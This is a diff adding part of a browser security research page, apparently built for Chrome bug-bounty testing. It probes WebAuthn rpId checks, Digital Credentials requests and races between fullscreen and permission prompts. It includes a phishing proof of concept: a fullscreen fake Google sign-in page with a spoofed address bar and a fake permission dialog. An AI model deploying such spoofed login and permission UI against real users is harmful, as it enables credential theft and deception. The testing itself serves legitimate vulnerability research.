+      <button class="btn btn-o" onclick="testGeoRace(0)">Geo: 0ms delay</button>
+      <button class="btn btn-o" onclick="testGeoRace(100)">Geo: 100ms</button>
+      <button class="btn btn-o" onclick="testGeoRace(300)">Geo: 300ms</button>
+    </div>
+    <div class="log" id="v3c-log"><span class="ll-b">→ Ready.</span></div>
+    <div class="result-banner" id="v3c-result"></div>
+  </div>
+</div>
+
+<!-- ══════ V3d — Stack Perms ══════ -->
+<div id="sec-v3d" class="section" style="display:none">
+  <div class="card" style="border-color:var(--orange)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--orange)">V3d</span>
+      <h2 style="margin-bottom:0">Permission Stacking — Multiple Dialogs</h2>
+    </div>
+    <div class="alert a-y">
+      Trigger multiple permission requests rapid-fire saat fullscreen.
+      Apakah salah satu dialog kehilangan origin label saat dialogs menumpuk?
+    </div>
+    <div class="bgroup">
+      <button class="btn btn-o" onclick="testPermStack()">Stack: Notify + Camera + Geo</button>
+      <button class="btn btn-o" onclick="testPermStack2()">Stack: All at once (fullscreen)</button>
+    </div>
+    <div class="log" id="v3d-log"><span class="ll-b">→ Ready.</span></div>
+    <div class="result-banner" id="v3d-result"></div>
+  </div>
+</div>
+
+<!-- ══════ V3e — Fake Perm UI ══════ -->
+<div id="sec-v3e" class="section" style="display:none">
+  <div class="card" style="border-color:var(--red)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--red)">V3e</span>
+      <span class="rb rb-r">Phishing Demo</span>
+      <h2 style="margin-bottom:0">Fake Permission UI in Fullscreen — Phishing Demo</h2>
+    </div>
+    <div class="alert a-r">
+      Kalau real permission dialog tidak muncul dengan origin (atau tertutupi fake UI),
+      attacker bisa tampilkan permission dialog palsu. Demo ini menunjukkan efeknya.
+    </div>
+
+    <button class="btn btn-r" onclick="launchFakePermDemo()">▶ Launch Fake Permission Demo</button>
+    <div class="log" id="v3e-log"><span class="ll-b">→ Launch untuk lihat demo.</span></div>
+    <p style="font-size:11px;color:var(--dim);margin-top:8px">
+      Perhatikan: real Chrome permission dialog selalu tampil <em>di atas</em> fullscreen dan
+      menampilkan origin. Bug valid = kalau fake dialog bisa menutupi real dialog,
+      atau real dialog tidak muncul sama sekali.
+    </p>
+  </div>
+</div>
+
+<!-- ══════ ENV CHECK ══════ -->
+<div id="sec-env" class="section" style="display:none">
+  <div class="card">
+    <div class="card-hdr"><span class="badge">ENV</span><h2 style="margin-bottom:0">Environment Check</h2></div>
+    <button class="btn btn-g" onclick="runAllChecks()">Run All Checks</button>
+    <div class="log" id="env-log" style="max-height:300px"><span class="ll-b">→ Click Run All.</span></div>
+  </div>
+</div>
+
+<!-- ══════ NOTES ══════ -->
+<div id="sec-notes" class="section" style="display:none">
+  <div class="card">
+    <div class="card-hdr"><span class="badge" style="color:var(--green)">NOTES</span><h2>Lab Notes</h2></div>
+    <textarea id="lab-notes" style="width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text);font-family:monospace;font-size:12px;resize:vertical;min-height:160px;outline:none"
+      placeholder="Catat hasil observasi...
+[V1a] Chrome 126 — rpId mismatch → SecurityError immediately, no UI shown
+[V2a] Digital Creds API not available (need flag)
+[V3a] 0ms race: perm dialog appeared AFTER fullscreen UI settled, origin visible
+[V3a] 200ms race: perm dialog appeared during transition, origin label..."></textarea>
+    <div class="bgroup">
+      <button class="btn btn-g btn-sm" onclick="exportNotes()">Export Notes</button>
+      <button class="btn btn-sm" onclick="document.getElementById('lab-notes').value=''">Clear</button>
+    </div>
+  </div>
+</div>
+
+</main>
+</div>
+
+<!-- ══ Fullscreen Overlay ══ -->
+<div id="fs-overlay">
+  <div id="fs-toolbar">
+    <span style="color:#5f6368;font-size:20px;margin-right:4px">← → ↻</span>
+    <div id="fs-urlbar">
+      <span style="color:#188038;font-size:15px">🔒</span>
+      <span id="fs-domain" style="color:#202124;font-size:14px">accounts.google.com</span>
+    </div>
+    <span style="color:#5f6368;font-size:20px;margin-left:8px">⋮</span>
+  </div>
+  <div id="fs-content" style="flex:1;display:flex;align-items:center;justify-content:center;background:#f8f9fa">
+    <div style="background:#fff;border:1px solid #dadce0;border-radius:8px;padding:40px;width:380px;box-shadow:0 2px 10px rgba(0,0,0,.1)">
+      <div style="text-align:center;margin-bottom:20px;font-size:22px;font-weight:400;color:#202124">Sign in</div>
+      <div style="text-align:center;font-size:14px;color:#5f6368;margin-bottom:20px">to continue to Google Account</div>
+      <input type="email" id="fake-email" placeholder="Email or phone"
+        style="width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:15px;margin-bottom:12px;outline:none">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <span style="color:#1a73e8;font-size:13px;cursor:pointer">Forgot email?</span>
+        <button onclick="captureFakeEmail()" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:9px 22px;font-size:13px;font-weight:500;cursor:pointer">Next</button>
+      </div>
+      <div style="margin-top:16px;text-align:center;font-size:11px;color:#ea4335;border:1px solid #f28b82;border-radius:4px;padding:6px">
+        ⚠ RESEARCH PoC — Not real Google
+      </div>
+    </div>
+  </div>
+  <div id="perm-overlay" class="perm-overlay">
+    <h4><span id="perm-site-icon">🔔</span> <span id="perm-title">wants to send notifications</span></h4>
+    <p><span class="origin" id="perm-origin-display">—</span></p>
+    <div class="perm-row">
+      <button class="perm-btn perm-deny" onclick="dismissFakePerm('deny')">Block</button>
+      <button class="perm-btn perm-allow" onclick="dismissFakePerm('allow')">Allow</button>
+    </div>
+  </div>
+  <button onclick="exitFakeFS()" style="position:fixed;bottom:14px;right:14px;background:rgba(0,0,0,.5);color:#fff;border:none;border-radius:20px;padding:7px 16px;font-size:12px;cursor:pointer;z-index:9999999">Exit Demo</button>
+</div>
+
+<script>
+// ─────────────────────────────────────────────
+// Navigation
+// ─────────────────────────────────────────────
+let currentSection = 'overview';
+
+function showSection(id) {
+  document.querySelectorAll('.section').forEach(s => s.style.display = 'none');
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  const sec = document.getElementById('sec-' + id);
+  if (sec) { sec.style.display = 'block'; currentSection = id; }
+  event && event.target && event.target.classList.add('active');
+}
+
+// ─────────────────────────────────────────────
+// Logger helpers
+// ─────────────────────────────────────────────
+function log(logId, msg, cls) {
+  const el = document.getElementById(logId);
+  if (!el) return;
+  const span = document.createElement('span');
+  span.className = cls || 'll-d';
+  span.textContent = '[' + new Date().toLocaleTimeString('en',{hour12:false}) + '] ' + msg;
+  el.appendChild(span);
+  el.appendChild(document.createElement('br'));
+  el.scrollTop = el.scrollHeight;
+}
+
+function setResult(id, msg, type) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = msg;
+  el.className = 'result-banner ' + type;
+  el.style.display = 'block';
+}
+
+function setChip(id, text, state) {
+  const el = document.getElementById(id);
+  if (el) { el.textContent = text; el.className = 'chip ' + state; }
+}
+
+// ─────────────────────────────────────────────
+// Environment Checks
+// ─────────────────────────────────────────────
+function runAllChecks() {
+  const logId = currentSection === 'env' ? 'env-log' : 'overview-log';
+  const isHttps = location.protocol === 'https:' || location.hostname === 'localhost';
+
+  log(logId, 'Origin: ' + location.origin, 'll-b');
+  log(logId, 'Protocol: ' + location.protocol + (isHttps ? ' ✓ secure' : ' ✗ NOT secure (keyboard.lock / WebAuthn need HTTPS)'), isHttps ? 'll-g' : 'll-r');
+
+  // WebAuthn
+  const hasWA = !!(navigator.credentials && window.PublicKeyCredential);
+  log(logId, 'WebAuthn: ' + (hasWA ? '✓ available' : '✗ not available'), hasWA ? 'll-g' : 'll-r');
+  setChip('chip-v1-webauthn', 'WebAuthn: ' + (hasWA ? 'AVAILABLE' : 'N/A'), hasWA ? 'ok' : 'err');
+
+  // HTTPS for WebAuthn
+  document.getElementById('v1-https-val').textContent = isHttps ? '✓' : '✗ need HTTPS';
+  setChip('chip-v1-https', 'HTTPS: ' + (isHttps ? 'YES ✓' : 'NO ✗'), isHttps ? 'ok' : 'err');
+
+  // Digital Credentials
+  const hasDC = !!(navigator.credentials && typeof navigator.credentials.get === 'function');
+  log(logId, 'Credentials API: ' + (hasDC ? '✓ available (Digital Creds needs flag)' : '✗ not available'), hasDC ? 'll-y' : 'll-r');
+
+  // Notifications
+  const hasNotif = 'Notification' in window;
+  const notifPerm = hasNotif ? Notification.permission : 'N/A';
+  log(logId, 'Notifications: ' + (hasNotif ? '✓ API available, permission=' + notifPerm : '✗ not available'), hasNotif ? 'll-g' : 'll-r');
+  document.getElementById('v3a-perm-val').textContent = notifPerm;
+
+  // Fullscreen
+  const hasFS = !!(document.documentElement.requestFullscreen);
+  log(logId, 'Fullscreen API: ' + (hasFS ? '✓ available' : '✗ not available'), hasFS ? 'll-g' : 'll-r');
+  document.getElementById('v3a-fs-val').textContent = hasFS ? 'available' : 'N/A';
+
+  // getUserMedia
+  const hasGUM = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+  log(logId, 'getUserMedia: ' + (hasGUM ? '✓ available' : '✗ not available'), hasGUM ? 'll-g' : 'll-r');
+
+  // Geolocation
+  const hasGeo = !!(navigator.geolocation);
+  log(logId, 'Geolocation: ' + (hasGeo ? '✓ available' : '✗ not available'), hasGeo ? 'll-g' : 'll-r');
+
+  // User Agent
+  log(logId, 'UA: ' + navigator.userAgent.substring(0, 100), 'll-d');
+
+  // Check Digital Credentials specifically
+  checkDigitalCredsAPI();
+}
+
+// ─────────────────────────────────────────────
+// V1 — WebAuthn Tests
+// ─────────────────────────────────────────────
+let createdCredId = null;
+
+async function testWebAuthnBasic(targetRpId) {
+  const logId = 'v1-log-basic';
+  log(logId, 'Testing rpId: "' + targetRpId + '" from origin: ' + location.hostname, 'll-b');
+  try {
+    const result = await navigator.credentials.get({
+      publicKey: {
+        rpId: targetRpId,
+        challenge: crypto.getRandomValues(new Uint8Array(32)),
+        allowCredentials: [],
+        userVerification: 'discouraged',
+        timeout: 8000
+      }
+    });
+    log(logId, 'SUCCESS — credential returned: ' + JSON.stringify(result?.type), 'll-g');
+    setResult('v1-result-basic', '⚠ UNEXPECTED SUCCESS — credentials returned for rpId: ' + targetRpId, 'bypass');
+  } catch(e) {
+    log(logId, 'Error [' + e.name + ']: ' + e.message, e.name === 'SecurityError' ? 'll-r' : 'll-y');
+
+    if (e.name === 'SecurityError') {
+      log(logId, '→ Expected rejection. Chrome enforces rpId must be suffix of page domain.', 'll-g');
+      setResult('v1-result-basic', '✓ Blocked — SecurityError (expected Chrome behavior). No UI shown.', 'patched');
+    } else if (e.name === 'NotAllowedError') {
+      log(logId, '→ NotAllowedError: UI may have appeared. Was there a dialog? What origin did it show?', 'll-y');
+      setResult('v1-result-basic', '⚠ NotAllowedError — UI may have appeared. Screenshot origin label!', 'partial');
+    } else if (e.name === 'AbortError') {
+      log(logId, '→ User cancelled / timeout. Was UI shown? What origin did dialog display?', 'll-y');
+      setResult('v1-result-basic', '⚠ Aborted — check if dialog appeared and what origin was shown', 'partial');
+    }
+
+    // VRP relevance
+    log(logId, '── VRP analysis ──', 'll-d');
+    if (e.name === 'SecurityError' && targetRpId !== location.hostname) {
+      log(logId, 'No dialog shown for mismatched rpId = Chrome is secure for this case.', 'll-g');
+    }
+  }
+}
+
+async function testWebAuthnSubdomain() {
+  const logId = 'v1-log-sub';
+  const parts = location.hostname.split('.');
+  const parentDomain = parts.length > 2 ? parts.slice(1).join('.') : location.hostname;
+  log(logId, 'Current hostname: ' + location.hostname, 'll-b');
+  log(logId, 'Testing parent rpId: ' + parentDomain, 'll-b');
+  log(logId, 'Note: This is VALID per spec if hostname is a subdomain of parentDomain', 'll-d');
+  try {
+    await navigator.credentials.get({
+      publicKey: {
+        rpId: parentDomain,
+        challenge: crypto.getRandomValues(new Uint8Array(32)),
+        allowCredentials: [],
+        timeout: 5000
+      }
+    });
+    log(logId, 'Result: success or timeout — was origin label "' + parentDomain + '" shown?', 'll-y');
+  } catch(e) {
+    log(logId, 'Error: ' + e.name + ' — ' + e.message, 'll-y');
+    log(logId, 'Key Q: Did any UI appear? What origin label was displayed?', 'll-b');
+  }
+}
+
+async function testWebAuthnIframe() {
+  const logId = 'v1-log-iframe';
+  log(logId, 'Creating cross-origin iframe test...', 'll-b');
+  const iframe = document.createElement('iframe');
+  iframe.allow = 'publickey-credentials-get';
+  iframe.srcdoc = `<script>
+    navigator.credentials.get({
+      publicKey: {
+        rpId: "${location.hostname}",
+        challenge: new Uint8Array(32),
+        allowCredentials: [],
+        timeout: 3000
+      }
+    }).then(r => parent.postMessage({type:'ok',data:String(r)},'*'))
+      .catch(e => parent.postMessage({type:'err',name:e.name,msg:e.message},'*'));
+  <\/script>`;
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  window.addEventListener('message', function handler(e) {
+    log(logId, 'iframe result: [' + e.data.type + '] ' + (e.data.msg || e.data.data), e.data.type === 'ok' ? 'll-g' : 'll-y');
+    window.removeEventListener('message', handler);
+    iframe.remove();
+  });
+  log(logId, 'iframe created — waiting for result...', 'll-d');
+}
+
+async function createWebAuthnCred() {
+  const logId = 'v1-log-create';
+  log(logId, 'Creating WebAuthn credential at origin: ' + location.hostname, 'll-b');
+  try {
+    const cred = await navigator.credentials.create({
+      publicKey: {
+        rp: { id: location.hostname, name: 'Origin Spoof Lab' },
+        user: {
+          id: crypto.getRandomValues(new Uint8Array(16)),
+          name: 'test@vrplab.local',
+          displayName: 'VRP Test User'
+        },
+        challenge: crypto.getRandomValues(new Uint8Array(32)),
+        pubKeyCredParams: [{ type: 'public-key', alg: -7 }, { type: 'public-key', alg: -257 }],
+        timeout: 60000,
+        authenticatorSelection: { residentKey: 'preferred', userVerification: 'preferred' }
+      }
+    });
+    createdCredId = cred.rawId;
+    log(logId, 'Credential created: ' + cred.type + ' id=' + cred.id.substring(0,20) + '...', 'll-g');
+    log(logId, '→ Now click "Step 2: Get + Observe" and watch the picker UI', 'll-y');
+    document.getElementById('btn-get-cred').disabled = false;
+  } catch(e) {
+    log(logId, 'Create failed: ' + e.name + ': ' + e.message, 'll-r');
+    if (e.name === 'NotAllowedError') log(logId, '→ Need HTTPS or user cancelled', 'll-y');
+  }
+}
+
+async function getWebAuthnCred() {
+  const logId = 'v1-log-create';
+  log(logId, 'Getting credential — observe picker UI origin label...', 'll-b');
+  try {
+    const cred = await navigator.credentials.get({
+      publicKey: {
+        rpId: location.hostname,
+        challenge: crypto.getRandomValues(new Uint8Array(32)),
+        allowCredentials: createdCredId ? [{ type: 'public-key', id: createdCredId }] : [],
+        userVerification: 'preferred',
+        timeout: 30000
+      }
+    });
+    log(logId, 'Got credential — type: ' + cred.type, 'll-g');
+    log(logId, '→ What origin label did the picker show? Screenshot it!', 'll-y');
+  } catch(e) {
+    log(logId, 'Get result: ' + e.name + ': ' + e.message, 'll-y');
+    log(logId, '→ Was any UI shown? What origin was displayed?', 'll-b');
+  }
+}
+
+async function testConditionalUI() {
+  const logId = 'v1b-log';
+  log(logId, 'Triggering conditional mediation WebAuthn...', 'll-b');
+  log(logId, 'After click, focus the input field above to see autofill suggestion', 'll-y');
+  try {
+    const cred = await navigator.credentials.get({
+      mediation: 'conditional',
+      publicKey: {
+        challenge: crypto.getRandomValues(new Uint8Array(32)),
+        rpId: location.hostname,
+        allowCredentials: [],
+        userVerification: 'preferred'
+      }
+    });
+    log(logId, 'Credential selected: ' + cred?.id?.substring(0,20), 'll-g');
+  } catch(e) {
+    log(logId, e.name + ': ' + e.message, 'll-y');
+    if (e.name === 'NotSupportedError') log(logId, '→ Conditional mediation not supported in this browser', 'll-r');
+  }
+}
+
+async function testWebAuthnErrors() {
+  const logId = 'v1c-log';
+  const testRpIds = ['evil.com', '*.com', '', 'localhost', location.hostname + '.evil.com'];
+  for (const rpId of testRpIds) {
+    try {
+      await Promise.race([
+        navigator.credentials.get({ publicKey: { rpId, challenge: new Uint8Array(32), allowCredentials: [], timeout: 500 } }),
+        new Promise((_,r) => setTimeout(() => r(new Error('timeout')), 600))
+      ]);
+      log(logId, '"' + rpId + '" → SUCCESS (unexpected!)', 'll-r');
+    } catch(e) {
+      log(logId, '"' + rpId + '" → ' + e.name + ': ' + e.message.substring(0, 80), 'll-d');
+    }
+  }
+}
+
+// ─────────────────────────────────────────────
+// V2 — Digital Credentials API
+// ─────────────────────────────────────────────
+async function checkDigitalCredsAPI() {
+  const logId = 'v2-log';
+  const isSecure = location.protocol === 'https:' || location.hostname === 'localhost';
+  document.getElementById('digital-https').textContent = isSecure ? '✓' : '✗';
+  setChip('chip-digital-https', 'Secure context: ' + (isSecure ? 'YES ✓' : 'NO ✗'), isSecure ? 'ok' : 'err');
+
+  // Test if digital credentials option is accepted
+  try {
+    const result = await Promise.race([
+      navigator.credentials.get({ digital: { requests: [] } }),
+      new Promise((_,r) => setTimeout(() => r(new Error('timeout')), 1000))
+    ]);
+    log(logId, 'Digital Credentials: API AVAILABLE and accepted request!', 'll-g');
+    setChip('chip-digital-creds', 'Digital Creds: AVAILABLE ✓', 'ok');
+    setResult('v2-result', '✓ Digital Credentials API available — proceed to V2b/V2c tests', 'bypass');
+    document.getElementById('v2-status').textContent = 'AVAILABLE';
+    document.getElementById('v2-status').className = 'chip ok';
+  } catch(e) {
+    if (e.message === 'timeout') {
+      log(logId, 'Digital Credentials: Timeout (possible dialog shown?)', 'll-y');
+      setChip('chip-digital-creds', 'Digital Creds: Timeout', 'warn');
+    } else if (e.name === 'NotSupportedError' || e.message.includes('digital')) {
+      log(logId, 'Digital Credentials: API not available — ' + e.message, 'll-r');
+      setChip('chip-digital-creds', 'Digital Creds: NOT AVAILABLE', 'err');
+      log(logId, '→ Enable at chrome://flags/#web-identity-digital-credentials', 'll-y');
+      setResult('v2-result', '✗ Not available — enable chrome://flags/#web-identity-digital-credentials', 'patched');
+      document.getElementById('v2-status').textContent = 'UNAVAILABLE';
+      document.getElementById('v2-status').className = 'chip err';
+    } else if (e.name === 'TypeError') {
+      log(logId, 'TypeError: ' + e.message + ' (unknown option — API not supported)', 'll-r');
+      setChip('chip-digital-creds', 'Digital Creds: NOT SUPPORTED (TypeError)', 'err');
+    } else {
+      log(logId, 'Unexpected: ' + e.name + ': ' + e.message, 'll-y');
+      setChip('chip-digital-creds', 'Digital Creds: ' + e.name, 'warn');
+    }
+  }
+}
+
+async function testOpenID4VP() {
+  const logId = 'v2b-log';
+  log(logId, 'Sending OpenID4VP request...', 'll-b');
+  try {
+    const cred = await navigator.credentials.get({
+      digital: {
+        requests: [{
+          protocol: 'openid4vp',
+          data: JSON.stringify({
+            response_type: 'vp_token',
+            nonce: crypto.randomUUID(),
+            presentation_definition: {
+              id: 'vrp-test-' + Date.now(),
+              input_descriptors: [{
+                id: 'id-card',
+                format: { mso_mdoc: { alg: ['ES256'] } },
+                constraints: {
+                  fields: [{ path: ["$['org.iso.18013.5.1']['family_name']"], intent_to_retain: false }]
+                }
+              }]
+            }
+          })
+        }]
+      }
+    });
+    log(logId, 'Response received: ' + JSON.stringify(cred).substring(0,200), 'll-g');
+    log(logId, '→ CRITICAL: Screenshot what origin was shown in the system dialog!', 'll-r');
+    setResult('v2b-result', '⚡ API responded — document the origin label shown in system dialog for VRP!', 'bypass');
+  } catch(e) {
+    log(logId, e.name + ': ' + e.message, e.name === 'NotSupportedError' ? 'll-r' : 'll-y');
+    if (e.name === 'AbortError') {
+      log(logId, '→ User cancelled. Was a dialog shown? What origin was displayed?', 'll-y');
+      setResult('v2b-result', '⚠ Dialog may have appeared — screenshot origin label', 'partial');
+    } else {
+      log(logId, '→ Enable flag: chrome://flags/#web-identity-digital-credentials', 'll-y');
+    }
+  }
+}
+
+async function testOpenID4VP_iframe() {
+  const logId = 'v2b-log';
+  log(logId, 'Testing Digital Credentials from cross-origin iframe...', 'll-b');
+  log(logId, '(This would need actual cross-origin iframe setup — documenting attack surface)', 'll-y');
+  log(logId, 'Key question: does "allow=identity-credentials-get" permission policy work?', 'll-b');
+  log(logId, 'If yes: iframe origin might be displayed instead of top-level origin → origin spoof', 'll-r');
+}
+
+async function testMDL(protocol) {
+  const logId = 'v2c-log';
+  log(logId, 'Requesting mDL via protocol: ' + protocol, 'll-b');
+  const data = protocol === 'preview'
+    ? { selector: { format: [{ designator: 'mdoc' }], doctype: 'org.iso.18013.5.1.mDL', fields: [{ namespace: 'org.iso.18013.5.1', name: 'family_name', intentToRetain: false }] }, nonce: crypto.randomUUID() }
+    : JSON.stringify({ response_type: 'vp_token', nonce: crypto.randomUUID(), presentation_definition: { id: 'mdl-test', input_descriptors: [{ id: 'mdl', format: { mso_mdoc: { alg: ['ES256'] } }, constraints: { fields: [{ path: ["$['org.iso.18013.5.1']['family_name']"] }] } }] } });
+  try {
+    await navigator.credentials.get({ digital: { requests: [{ protocol, data }] } });
+    log(logId, 'mDL response received — document origin displayed in dialog!', 'll-g');
+    setResult('v2c-result', '⚡ mDL dialog triggered — screenshot origin for VRP', 'bypass');
+  } catch(e) {
+    log(logId, e.name + ': ' + e.message, 'll-y');
+    if (e.name === 'AbortError') setResult('v2c-result', '⚠ Dialog appeared — was origin shown correctly?', 'partial');
+  }
+}
+
+// ─────────────────────────────────────────────
+// V3 — Permission + Fullscreen Race
+// ─────────────────────────────────────────────
+let escCount = 0;
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    escCount++;
+    setChip('chip-v3a-esc', 'ESC presses: ' + escCount, 'warn');
+  }
+});
+
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) {
+    ['v3a','v3b','v3c','v3d'].forEach(id => {
+      const el = document.getElementById(id + '-log');
+      if (el) log(id + '-log', 'Fullscreen exited', 'll-y');
+    });
+  }
+});
+
+async function enterFullscreen() {
+  await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+}
+
+async function testNotifyRace(delay) {
+  const logId = 'v3a-log';
+  log(logId, 'Test: Notification race with ' + delay + 'ms delay', 'll-b');
+  escCount = 0;
+  try {
+    const fsPromise = enterFullscreen();
+    if (delay === 0) {
+      // Simultaneous
+      Notification.requestPermission().then(p => {
+        log(logId, 'Notification permission result: ' + p + ' (was origin label visible?)', 'll-y');
+        setResult('v3a-result',
+          p === 'denied'
+            ? '⚠ ESC dismissed dialog. Screenshot — was origin shown when dialog appeared?'
+            : '⚠ Check: was origin visible in dialog during fullscreen transition?',
+          'partial');
+      });
+      await fsPromise;
+    } else {
+      await fsPromise;
+      log(logId, 'Fullscreen active. Waiting ' + delay + 'ms...', 'll-d');
+      setTimeout(() => {
+        log(logId, 'Triggering Notification.requestPermission() now', 'll-b');
+        log(logId, '→ Screenshot permission dialog — is origin label visible?', 'll-r');
+        Notification.requestPermission().then(p => {
+          log(logId, 'Permission: ' + p + ' — origin shown in dialog? [YES/NO → note in Lab Notes]', 'll-y');
+        });
+      }, delay);
+    }
+  } catch(e) {
+    log(logId, 'Error: ' + e.message, 'll-r');
+  }
+}
+
+async function testNotifyExitRace() {
+  const logId = 'v3a-log';
+  log(logId, 'Test: Permission during fullscreen EXIT transition', 'll-b');
+  try {
+    await enterFullscreen();
+    log(logId, 'In fullscreen. Exiting in 500ms + triggering permission simultaneously...', 'll-d');
+    setTimeout(async () => {
+      document.exitFullscreen();
+      Notification.requestPermission().then(p => {
+        log(logId, 'Permission during exit: ' + p + ' — origin visible?', 'll-y');
+      });
+    }, 500);
+  } catch(e) {
+    log(logId, 'Error: ' + e.message, 'll-r');
+  }
+}
+
+async function testMediaRace(type, delay) {
+  const logId = 'v3b-log';
+  const constraints = type === 'camera' ? { video: true } : type === 'mic' ? { audio: true } : { video: true, audio: true };
+  log(logId, 'Test: ' + type + ' permission race, delay=' + delay + 'ms', 'll-b');
+  try {
+    const fsP = enterFullscreen();
+    if (delay === 0) {
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(s => { s.getTracks().forEach(t => t.stop()); log(logId, type + ' GRANTED — origin in dialog?', 'll-y'); })
+        .catch(e => log(logId, type + ' denied/error: ' + e.message + ' — was origin shown?', 'll-y'));
+      await fsP;
+    } else {
+      await fsP;
+      setTimeout(() => {
+        navigator.mediaDevices.getUserMedia(constraints)
+          .then(s => { s.getTracks().forEach(t => t.stop()); log(logId, type + ' GRANTED', 'll-y'); })
+          .catch(e => log(logId, type + ' result: ' + e.message, 'll-y'));
+      }, delay);
+    }
+    log(logId, '→ Screenshot the permission dialog. Is origin label visible?', 'll-r');
+    setResult('v3b-result', '⚠ Check screenshot — is "' + location.hostname + '" visible in permission dialog?', 'pending');
+  } catch(e) {
+    log(logId, 'Fullscreen error: ' + e.message, 'll-r');
+  }
+}
+
+async function testGeoRace(delay) {
+  const logId = 'v3c-log';
+  log(logId, 'Test: Geolocation race, delay=' + delay + 'ms', 'll-b');
+  try {
+    await enterFullscreen();
+    setTimeout(() => {
+      navigator.geolocation.getCurrentPosition(
+        () => log(logId, 'Geo GRANTED — was origin shown?', 'll-y'),
+        e => log(logId, 'Geo result: ' + e.message + ' — was origin shown?', 'll-y'),
+        { timeout: 8000 }
+      );
+      log(logId, '→ Screenshot geolocation dialog. Origin visible?', 'll-r');
+    }, delay);
+  } catch(e) {
+    log(logId, 'Error: ' + e.message, 'll-r');
+  }
+}
+
+async function testPermStack() {
+  const logId = 'v3d-log';
+  log(logId, 'Stacking multiple permissions in fullscreen...', 'll-b');
+  try {
+    await enterFullscreen();
+    log(logId, 'Fullscreen active. Firing all permissions simultaneously...', 'll-d');
+    setTimeout(() => {
+      Notification.requestPermission().then(p => log(logId, 'Notify: ' + p, 'll-y'));
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(s => { s.getTracks().forEach(t => t.stop()); })
+        .catch(() => {});
+      navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 5000 });
+      log(logId, '→ All 3 permissions fired. How does browser handle stacking? Origin visible?', 'll-r');
+      setResult('v3d-result', '⚠ Multiple dialogs triggered — document order and origin visibility', 'pending');
+    }, 300);
+  } catch(e) {
+    log(logId, 'Error: ' + e.message, 'll-r');
+  }
+}
+
+async function testPermStack2() {
+  const logId = 'v3d-log';
+  log(logId, 'Test: All permissions fired BEFORE fullscreen settles (0ms)', 'll-b');
+  try {
+    const fsP = enterFullscreen();
+    Notification.requestPermission();
+    navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => {});
+    await fsP;
+    log(logId, '→ Permissions fired simultaneously with fullscreen request', 'll-y');
+    log(logId, '→ Check if any dialog appeared without origin label', 'll-r');
+  } catch(e) {
+    log(logId, 'Error: ' + e.message, 'll-r');
+  }
+}
+
+// ─────────────────────────────────────────────
+// V3e — Fake Permission Demo
+// ─────────────────────────────────────────────
+async function launchFakePermDemo() {
+  const logId = 'v3e-log';
+  log(logId, 'Launching fake permission UI demo...', 'll-b');
+  try {
+    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+    document.getElementById('fs-overlay').style.display = 'flex';
+    setTimeout(() => {
+      showFakePerm('notification', 'accounts.google.com');
+      log(logId, 'Fake permission dialog shown — compare with real Chrome permission dialog', 'll-y');
+      log(logId, 'Real dialog: appears ABOVE fullscreen, shows real origin from browser chrome', 'll-b');
+      log(logId, 'Fake dialog: inside fullscreen content, can show ANY origin string', 'll-r');
+    }, 600);
+  } catch(e) {
+    log(logId, 'Fullscreen failed: ' + e.message, 'll-r');
+  }
+}
+
+function showFakePerm(type, origin) {
+  const icons = { notification: '🔔', camera: '📷', mic: '🎤', geo: '📍' };
+  const labels = { notification: 'wants to send you notifications', camera: 'wants to use your camera', mic: 'wants to use your microphone', geo: 'wants to know your location' };
+  document.getElementById('perm-site-icon').textContent = icons[type] || '🔔';
+  document.getElementById('perm-title').textContent = labels[type] || 'wants permission';
+  document.getElementById('perm-origin-display').textContent = origin;
+  document.getElementById('perm-overlay').style.display = 'block';
+}
+
+function dismissFakePerm(action) {
+  document.getElementById('perm-overlay').style.display = 'none';
+  const logId = 'v3e-log';
+  log(logId, 'Fake perm ' + action + 'ed — attacker records choice: ' + action, 'll-r');
+}
+
+function exitFakeFS() {
+  document.getElementById('fs-overlay').style.display = 'none';
+  if (document.fullscreenElement) document.exitFullscreen();
+}
+
+function captureFakeEmail() {
+  const v = document.getElementById('fake-email').value;
+  alert('PoC: "' + (v || '(empty)') + '" captured.\nReal attack: exfil while user is in fullscreen.');
+}
+
+// ─────────────────────────────────────────────
+// Export
+// ─────────────────────────────────────────────
+function exportNotes() {
+  const notes = document.getElementById('lab-notes').value;
+  const blob = new Blob([
+    'Origin Spoof VRP Lab Notes\n' + new Date().toISOString() + '\n' +
+    'Browser: ' + navigator.userAgent + '\n' +
+    'Origin: ' + location.origin + '\n\n' +
+    '=== NOTES ===\n' + (notes || '(empty)') + '\n\n' +
+    '=== SUBMISSION TARGETS ===\n' +
+    'Chrome VRP: issues.chromium.org (Security component)\n' +
+    'Firefox VRP: bugzilla.mozilla.org/form.client.bounty\n' +
+    'Safari: product-security@apple.com\n'
+  ], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'origin-spoof-notes-' + Date.now() + '.txt';
+  a.click();
+}
+
+// ─────────────────────────────────────────────
+// Init
+// ─────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+  runAllChecks();
+});
+</script>
+</body>
+</html>
